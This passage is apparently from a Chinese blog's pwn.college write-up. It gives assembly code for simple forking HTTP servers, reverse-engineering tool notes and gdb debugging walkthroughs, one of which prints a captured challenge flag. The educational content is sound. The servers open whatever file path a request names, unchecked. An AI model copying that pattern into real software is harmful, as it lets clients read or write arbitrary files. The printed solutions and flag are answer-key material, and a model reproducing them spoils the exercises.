<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">===== Expected: Parent Process =====</span><br><span class="line">[ ] socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3</span><br><span class="line">[ ] bind(3, {sa_family=AF_INET, sin_port=htons(&lt;bind_port&gt;), sin_addr=inet_addr("&lt;bind_address&gt;")}, 16) = 0</span><br><span class="line">    - Bind to port 80</span><br><span class="line">    - Bind to address 0.0.0.0</span><br><span class="line">[ ] listen(3, 0) = 0</span><br><span class="line">[ ] accept(3, NULL, NULL) = 4</span><br><span class="line">[ ] fork() = &lt;fork_result&gt;</span><br><span class="line">[ ] close(4) = 0</span><br><span class="line">[ ] accept(3, NULL, NULL) = ?</span><br><span class="line"></span><br><span class="line">===== Expected: Child Process =====</span><br><span class="line">[ ] close(3) = 0</span><br><span class="line">[ ] read(4, &lt;read_request&gt;, &lt;read_request_count&gt;) = &lt;read_request_result&gt;</span><br><span class="line">[ ] open("&lt;open_path&gt;", O_RDONLY) = 3</span><br><span class="line">[ ] read(3, &lt;read_file&gt;, &lt;read_file_count&gt;) = &lt;read_file_result&gt;</span><br><span class="line">[ ] close(3) = 0</span><br><span class="line">[ ] write(4, "HTTP/1.0 200 OK\r\n\r\n", 19) = 19</span><br><span class="line">[ ] write(4, &lt;write_file&gt;, &lt;write_file_count&gt;) = &lt;write_file_result&gt;</span><br><span class="line">[ ] exit(0) = ?</span><br></pre></td></tr></tbody></table></figure>
<p>wp：通过<code>fork</code>函数的返回值判断是父进程还是子进程</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line"># creat a socket</span><br><span class="line">    mov rdi, 2</span><br><span class="line">    mov rsi, 1</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 41  # socket</span><br><span class="line">    syscall</span><br><span class="line">    mov sock_f, rax  # 为了第二个accept能够调用该套接字</span><br><span class="line"></span><br><span class="line"># bind a socket</span><br><span class="line">    push 0x0</span><br><span class="line">    push 0x0000000050000002</span><br><span class="line"></span><br><span class="line">    mov rdi, rax</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    mov rdx, 16</span><br><span class="line">    mov rax, 49  # bind</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># listen a socket</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rax, 50</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># accept a connection</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 43</span><br><span class="line">    syscall</span><br><span class="line">    mov accept_f, rax</span><br><span class="line">    push rax # 方便子进程的read函数调用</span><br><span class="line"></span><br><span class="line"># fork</span><br><span class="line">    mov rax, 57</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># 根据返回值判断是子进程还是父进程</span><br><span class="line">    cmp rax, 0</span><br><span class="line">    je Child</span><br><span class="line">    jne Parent</span><br><span class="line"></span><br><span class="line">Child:</span><br><span class="line"># close 第一个socket</span><br><span class="line">    mov rdi, sock_f</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># read</span><br><span class="line">    pop rdi</span><br><span class="line">    push rdi</span><br><span class="line">    lea rsi, array</span><br><span class="line">    mov rdx, 256</span><br><span class="line">    mov rax, 0</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># open</span><br><span class="line">    lea rdi, [array+4] # 获取文件路径字符串的起始地址</span><br><span class="line">    movb [rdi+16], 0   # 文件路径长度为16，需要截断</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rax, 2</span><br><span class="line">    syscall</span><br><span class="line">    push rax</span><br><span class="line"></span><br><span class="line"># read</span><br><span class="line">    mov rdi, rax</span><br><span class="line">    lea rsi, buf</span><br><span class="line">    mov rdx, 512</span><br><span class="line">    mov rax, 0</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">mov length, rax # 获取文件读取的长度</span><br><span class="line"></span><br><span class="line"># close</span><br><span class="line">    pop rdi  # 获取 open 返回值</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># write</span><br><span class="line">    pop rdi  # 获取accept返回值</span><br><span class="line">    lea rsi, hello</span><br><span class="line">    mov rdx, 19</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># write</span><br><span class="line">    lea rsi, buf</span><br><span class="line">    mov rdx, length</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># exit</span><br><span class="line">    mov rdi, 0</span><br><span class="line">    mov rax, 60  # SYS_exit</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">Parent:</span><br><span class="line"># close</span><br><span class="line">    mov rdi, accept_f</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># accept</span><br><span class="line">    mov rdi, sock_f</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 43</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">    array:</span><br><span class="line">        .fill 256, 1, 0  # 分配 256 字节并初始化为 0</span><br><span class="line">    hello:</span><br><span class="line">        .ascii "HTTP/1.0 200 OK\r\n\r\n" # 用于定义一个不以零字节结尾的字符串</span><br><span class="line">    buf:</span><br><span class="line">        .fill 512, 1, 0  # 存放打开文件的内容</span><br><span class="line">    length:</span><br><span class="line">        .quad 0 # 定义一个 8 字节变量并初始化为 0</span><br><span class="line">    sock_f:</span><br><span class="line">        .quad 0 # 定义一个 8 字节变量并初始化为 0</span><br><span class="line">    accept_f:</span><br><span class="line">        .quad 0</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level10：多个程序动态响应多个HTTP请求（POST）。题目要求如下：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">===== Expected: Parent Process =====</span><br><span class="line">[ ] execve(&lt;execve_args&gt;) = 0</span><br><span class="line">[ ] socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3</span><br><span class="line">[ ] bind(3, {sa_family=AF_INET, sin_port=htons(&lt;bind_port&gt;), sin_addr=inet_addr("&lt;bind_address&gt;")}, 16) = 0</span><br><span class="line">    - Bind to port 80</span><br><span class="line">    - Bind to address 0.0.0.0</span><br><span class="line">[ ] listen(3, 0) = 0</span><br><span class="line">[ ] accept(3, NULL, NULL) = 4</span><br><span class="line">[ ] fork() = &lt;fork_result&gt;</span><br><span class="line">[ ] close(4) = 0</span><br><span class="line">[ ] accept(3, NULL, NULL) = ?</span><br><span class="line"></span><br><span class="line">===== Expected: Child Process =====</span><br><span class="line">[ ] close(3) = 0</span><br><span class="line">[ ] read(4, &lt;read_request&gt;, &lt;read_request_count&gt;) = &lt;read_request_result&gt;</span><br><span class="line">[ ] open("&lt;open_path&gt;", O_WRONLY|O_CREAT, 0777) = 3</span><br><span class="line">[ ] write(3, &lt;write_file&gt;, &lt;write_file_count&gt;) = &lt;write_file_result&gt;</span><br><span class="line">[ ] close(3) = 0</span><br><span class="line">[ ] write(4, "HTTP/1.0 200 OK\r\n\r\n", 19) = 19</span><br><span class="line">[ ] exit(0) = ?</span><br></pre></td></tr></tbody></table></figure>
<p>wp：父进程的要求与上一关相同，只需修改子进程的代码。子进程的代码逻辑是通过POST将数据传送给服务器的指定文件中，所以将数据读入缓冲区后，需要利用<code>open</code>创建文件，然后通过<code>write</code>写入文件中，第二个<code>write</code>用于回复客户端。<strong>注意每个函数操作的文件描述符</strong>。这题获取POST请求中的数据和数据长度是难点，我了参考这个<a target="_blank" rel="noopener" href="https://tech.c01dkit.com/pwn-college-cse365-spring2023/#building-a-web-server-writeups">wp</a>，完整代码如下：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line"># creat a socket</span><br><span class="line">    mov rdi, 2</span><br><span class="line">    mov rsi, 1</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 41  # socket</span><br><span class="line">    syscall</span><br><span class="line">    mov sock_f, rax  # 为了第二个accept能够调用该套接字</span><br><span class="line"></span><br><span class="line"># bind a socket</span><br><span class="line">    push 0x0</span><br><span class="line">    push 0x0000000050000002</span><br><span class="line"></span><br><span class="line">    mov rdi, rax</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    mov rdx, 16</span><br><span class="line">    mov rax, 49  # bind</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># listen a socket</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rax, 50</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># accept a connection</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 43</span><br><span class="line">    syscall</span><br><span class="line">    mov accept_f, rax</span><br><span class="line">    push rax # 方便子进程的read函数调用</span><br><span class="line"></span><br><span class="line"># fork</span><br><span class="line">    mov rax, 57</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># 根据返回值判断是子进程还是父进程</span><br><span class="line">    cmp rax, 0</span><br><span class="line">    je Child</span><br><span class="line">    jne Parent</span><br><span class="line"></span><br><span class="line">Child:</span><br><span class="line"># close 第一个socket</span><br><span class="line">    mov rdi, sock_f</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># read</span><br><span class="line">    pop rdi</span><br><span class="line">    push rdi</span><br><span class="line">    lea rsi, array</span><br><span class="line">    mov rdx, 512</span><br><span class="line">    mov rax, 0</span><br><span class="line">    syscall</span><br><span class="line">    mov length, rax</span><br><span class="line"></span><br><span class="line"># open</span><br><span class="line">    lea rdi, [array+5] # 获取文件路径字符串的起始地址</span><br><span class="line">    movb [rdi+16], 0   # 文件路径长度为16，需要截断</span><br><span class="line">    mov rsi, 0x41</span><br><span class="line">    mov rdx, 0777</span><br><span class="line">    mov rax, 2</span><br><span class="line">    syscall</span><br><span class="line">    push rax</span><br><span class="line"></span><br><span class="line"># write</span><br><span class="line"># 获取POST请求内容，即写入文件的内容</span><br><span class="line">    mov rcx, 0</span><br><span class="line">    mov ebx, separate</span><br><span class="line">Content: # 若 eax!="\r\n\r\n" 则继续循环</span><br><span class="line">    mov eax, [array+rcx]</span><br><span class="line">    add rcx, 1  # 注意这里加法是在比较之前，所以之后跳过"\r\n\r\n"只需加3即可</span><br><span class="line">    cmp eax, ebx</span><br><span class="line">    jne Content</span><br><span class="line">    add rcx, 3</span><br><span class="line"></span><br><span class="line">    pop rdi # 获取open返回值</span><br><span class="line">    lea rsi, [array+rcx]</span><br><span class="line">    mov rdx, length  # length是总长度</span><br><span class="line">    sub rdx, rcx  # 总长度减去数据之前的字符长度即为数据大小</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># close</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># write</span><br><span class="line">    mov rdi, accept_f</span><br><span class="line">    lea rsi, hello</span><br><span class="line">    mov rdx, 19</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># exit</span><br><span class="line">    mov rdi, 0</span><br><span class="line">    mov rax, 60  # SYS_exit</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">Parent:</span><br><span class="line"># close</span><br><span class="line">    mov rdi, accept_f</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># accept</span><br><span class="line">    mov rdi, sock_f</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 43</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">    array:</span><br><span class="line">        .fill 512, 1, 0  # 分配 512 字节并初始化为 0</span><br><span class="line">    hello:</span><br><span class="line">        .ascii "HTTP/1.0 200 OK\r\n\r\n" # 用于定义一个不以零字节结尾的字符串</span><br><span class="line">    buf:</span><br><span class="line">        .fill 512, 1, 0  # 存放打开文件的内容</span><br><span class="line">    length:</span><br><span class="line">        .quad 0 # 定义一个 8 字节变量并初始化为 0</span><br><span class="line">    sock_f:</span><br><span class="line">        .quad 0 # 定义一个 8 字节变量并初始化为 0</span><br><span class="line">    accept_f:</span><br><span class="line">        .quad 0</span><br><span class="line">    separate:</span><br><span class="line">        .ascii "\r\n\r\n"</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level11：多个程序动态响应多个HTTP
GET和POST请求。题目没给提示，不太明白，参考大佬的<a target="_blank" rel="noopener" href="https://tech.c01dkit.com/pwn-college-cse365-spring2023/#building-a-web-server-writeups">wp</a></p></li>
</ul>
<h2 id="reverse-engineering">Reverse Engineering</h2>
<h3 id="知识点-3">知识点</h3>
<ul>
<li><p><code>cpp</code>命令：全称是——C 语言预处理程序（C
preprocessor），使用方式<code>cpp &lt;file_name&gt;.c</code>，运行该命令后会自动省略注释</p></li>
<li><p>ELF：一种用于可执行文件、目标代码、共享库和核心转储的标准文件格式（Linux）。当一个
ELF 可执行文件被加载到内存中时，其内存布局通常包括以下部分：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">代码段（.text segment）：存放可执行代码。</span><br><span class="line">数据段（.data segment）：存放已初始化的全局和静态变量。</span><br><span class="line">BSS 段（.bss segment）：存放未初始化的全局和静态变量。</span><br><span class="line">堆（heap）：用于动态内存分配，运行时通过 malloc 等函数进行分配，堆向上增长。</span><br><span class="line">栈（stack）：用于管理函数调用、局部变量、参数和返回地址，栈向下增长。</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>栈帧：<strong>函数调用</strong>期间保存在栈中的数据结构，用于存储参数、局部变量和返回地址等，其中<strong>局部变量</strong>在函数调用期间存储在栈帧中。而<strong>栈帧属于ELF内存布局中的栈的一部分</strong>。</p></li>
<li><p>static tools（静态分析工具）：</p>
<ul>
<li>Kaitai Struct：https://ide.kaitai.io/
二进制数据分析工具（在线）</li>
<li><code>nm</code>：用来检查二进制文件（包括库，编译后的目标模块，共享目标文件，和独立可执行文件）并显示这些文件的内容，或存储在其中的元信息，特别是符号表。具体参考这个<a target="_blank" rel="noopener" href="https://voidint.github.io/post/tool/nm/">教程</a></li>
<li><code>strings</code>：用于查看文件中出现的ASCII字符串</li>
<li><code>objdump</code>：查看二进制文件信息，可用于反汇编</li>
<li><a target="_blank" rel="noopener" href="https://github.com/slimm609/checksec.sh">checksec</a>：分析可执行文件的安全属性</li>
<li>高级反汇编器：IDA Pro，Binary Ninja，angr
management，ghidra，cutter</li>
</ul></li>
<li><p>dynamic tools（动态分析工具）：</p>
<ul>
<li><code>ltrace</code>：追踪库函数调用情况</li>
<li><code>strace</code>：追踪系统调用情况</li>
<li><code>gdb</code>：GNU软件系统中的标准调试器</li>
<li><code>qira</code>：随时回溯到之前的任意时间点的调试器，gdb也可以回溯</li>
</ul></li>
<li><p>逆向练习网站：https://crackmes.one/</p></li>
</ul>
<h3 id="练习-3">练习</h3>
<ul>
<li><p>Debugging
Refresher-level1：运行<code>/challenge/embryogdb_level1</code>打开本关gdb练习，然后输入<code>run</code>查看本关要求，下面是gdb相关命令</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">start：启动程序，并在main函数上设置一个断点。</span><br><span class="line">starti：启动程序，并在_start（程序的入口点）上设置一个断点。</span><br><span class="line">run：启动程序，但不设置任何断点。</span><br><span class="line">c：用来继续程序的执行</span><br><span class="line">b：打断点，可直接加&lt;函数名&gt;或者&lt;*+地址&gt;，如： b *<span class="number">0x00005614f4ed5c52</span></span><br></pre></td></tr></tbody></table></figure>
<p>wp：先<code>run</code>，然后执行<code>c</code>命令得到flag</p></li>
<li><p>Debugging Refresher-level2：使用相关命令可以查看寄存器的值</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">info registers：查看所有寄存器的当前值</span><br><span class="line">print 或 p 命令可以打印特定寄存器的值：</span><br><span class="line">	- p $rdi：会以十进制形式打印寄存器 $rdi 的值</span><br><span class="line">	- p/x $rdi： 会以十六进制形式打印寄存器 $rdi 的值</span><br></pre></td></tr></tbody></table></figure>
<p>这题的要求是读取<code>r12</code>寄存器的值</p>
<p>wp：<code>run</code>运行程序，使用<code>p/x $r12</code>得到寄存器的十六进制值，然后<code>c</code>继续运行程序，输入得到的寄存器值得到flag</p></li>
<li><p>Debugging Refresher-level3：<strong>内存查看命令</strong>
<code>x/&lt;n&gt;&lt;u&gt;&lt;f&gt; &lt;address&gt;</code></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;n&gt;：要显示的元素数量。</span><br><span class="line">&lt;u&gt;：显示的单位大小，可以是 b（1字节），h（2字节），w（4字节），和 g（8字节）。</span><br><span class="line">&lt;f&gt;：显示格式，可以是 d（十进制），x（十六进制），s（字符串）和 i（指令）。</span><br><span class="line">&lt;address&gt;：内存地址，可以是寄存器名、符号名或绝对地址。还可以使用数学表达式指定地址。</span><br></pre></td></tr></tbody></table></figure>
<p>下面是示例：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x/8i $rip：从当前指令指针 $rip 开始，打印接下来的8条指令。</span><br><span class="line">x/16i main：打印 main 函数的前16条指令。</span><br><span class="line">disassemble main 或 disas main：打印 main 函数的所有指令。</span><br><span class="line">x/16gx $rsp：打印栈上的前16个值（每个值为8字节）。</span><br><span class="line">x/gx $rbp-0x32：打印栈上存储在 $rbp-0x32 处的局部变量。</span><br></pre></td></tr></tbody></table></figure>
<p>使用命令 <code>set disassembly-flavor intel</code>
可以<strong>设置正确的汇编语法</strong>（Intel风格）</p>
<p>本题要求：需要找出栈上的随机值（从 <code>/dev/urandom</code>
读取的值，提示：从<code>read</code>入手）</p>
<p>wp：<code>read</code>将数据读入缓冲区即栈中，要找到该随机值，需要先找到缓冲区地址，首先使用<code>disas main</code>查看哪一步调用的<code>read</code>函数，找到后下断点<code>b *0x0000555a87da5c52</code>，接着使用<code>c</code>运行到断点处，然后使用<code>ni</code>进行单步操作，此时<code>read</code>函数运行结束，随机值已经写入缓冲区，同时缓冲区地址存储在<code>rsi</code>寄存器中，利用<code>p/x $rsi</code>读取地址，然后通过<code>p/x $rdx</code>获取读入的数据大小，最后<code>x/16gx $rsp</code>找到随机值，具体步骤如下</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">(gdb) b *0x0000555a87da5c52</span><br><span class="line">Breakpoint 1 at 0x555a87da5c52</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x0000555a87da5c52 in main ()</span><br><span class="line">(gdb) p/x $rsi</span><br><span class="line">$1 = 0x7ffcd01ec258</span><br><span class="line">(gdb) p/x $rdx</span><br><span class="line">$1 = 0x8</span><br><span class="line">(gdb) ni</span><br><span class="line">0x0000555a87da5c57 in main ()</span><br><span class="line">(gdb) x/16gx $rsp</span><br><span class="line">0x7ffcd01ec230: 0x0000000000000002      0x00007ffcd01ec378</span><br><span class="line">0x7ffcd01ec240: 0x00007ffcd01ec368      0x0000000187da5d10</span><br><span class="line">0x7ffcd01ec250: 0x0000000000000000      0x548e09daf2aa196f</span><br><span class="line">0x7ffcd01ec260: 0x00007ffcd01ec360      0xf95498a84a54f000</span><br><span class="line">0x7ffcd01ec270: 0x0000000000000000      0x00007f939d396083</span><br><span class="line">0x7ffcd01ec280: 0x00007f939d59e620      0x00007ffcd01ec368</span><br><span class="line">0x7ffcd01ec290: 0x0000000100000000      0x0000555a87da5aa6</span><br><span class="line">0x7ffcd01ec2a0: 0x0000555a87da5d10      0x065983aff1f9bd70</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">The random value has been set!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Program received signal SIGTRAP, Trace/breakpoint trap.</span><br><span class="line">0x0000555a87da5c64 in main ()</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">Random value: 548e09daf2aa196f</span><br><span class="line">You input: 548e09daf2aa196f</span><br><span class="line">The correct answer is: 548e09daf2aa196f</span><br><span class="line">You win! Here is your flag:</span><br><span class="line">pwn.college{IvE7YRHrWYfzFx-_sveUOOl0qo4.0lN0IDLycDMyUzW}</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>Debugging Refresher-level4：动态调试</p>
